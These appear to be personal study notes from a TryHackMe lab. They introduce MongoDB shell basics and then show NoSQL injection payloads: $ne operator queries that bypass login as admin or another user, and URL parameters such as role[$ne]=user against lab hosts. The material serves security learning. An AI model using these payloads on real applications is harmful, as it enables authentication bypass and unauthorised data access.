# NoSQL Injection

## NoSQL Intro
Non-relational database, commonly used for big data and IoT due to fast queries, scalable, and flexible data structure.

**Collection** = tables or views in MySQL
**Document** = rows in MySQL
**Fields** = columns in MySQL

## MongoDB
Source: https://tryhackme.com/room/adventofcyber3

Stored in format called BSON, visually similar and support JSON.

Operators that being used:
`$and` - AND
`$or` - OR
`$eq` - equal
`$ne` - not equal
`$gt` - greater than
`$where` - matches records based on Javascript condition
`$exists` - matches records that have a certain field
`$regex` - matches records that satisfy certain regular expressions.

### Intro
```shell-session
mongo
show databases
```

Use or create new database
```shell-session
use AoC3
```

Create collection
```shell-session
db.createCollection("users")
db.getCollectionNames();
```

Add document
```shell-session
db.users.insert({id:"1", username: "admin", email: "admin@thm.labs", password: "idk2021!"})

db.users.insert({id:"2", username: "user", email: "user@thm.labs", password: "password1!"})
```

Update document
```shell-session
db.users.update({id:"2"}, {$set: {username: "tryhackme"}});
```

Remove document
```shell-session
db.users.remove({'id':'2'})
```

Remove collection
```shell-session
db.users.drop()
```

### JSON Objects
**Injection to login as admin**, using `users` collections the command can be `db.users.find({query})` or `db.users.findOne({query})` . Null reply is received when providing the wrong credentials.
```shell-session
> db.users.findOne({username: "admin", password: {"$ne":"xyz"}})
{
        "_id" : ObjectId("6183ef6292dea43d75f0c820"),
        "id" : "1",
        "username" : "admin",
        "email" : "admin@thm.labs",
        "password" : "adminpass"
}
```
Injection of JSON objection `{"$ne": "xyz"}` that returns True because the password of admin is not xyz.

**Injection to login as non admin**
```shell-session
> db.users.findOne({username:{"$ne":"admin"},password:{"$ne":"xyz"}})
{
        "_id" : ObjectId("6183ef5b92dea43d75f0c81f"),
        "id" : "2",
        "username" : "user",
        "email" : "user@thm.labs",
        "password" : "password1!"
}
```
Logged in as non admin user, because the injection in username and password.

### GET and POST Request
Look for entry point that doesn't sanitize input, then understand how the web passes the request to the database. YOur injection must match the `KEY:VALUE` in JSON objection.

```scheme
http://example.thm.labs/search?username=admin&role[$ne]=user
```

```scheme
http://example.thm.labs/search?username=ben&role=user
```

List usernames that have a user role, except ben
```scheme
http://example.thm.labs/search?username[$ne]=ben&role=user
```

![](attachments/11ebe0504325632b2690ebb147fdcf58.png)

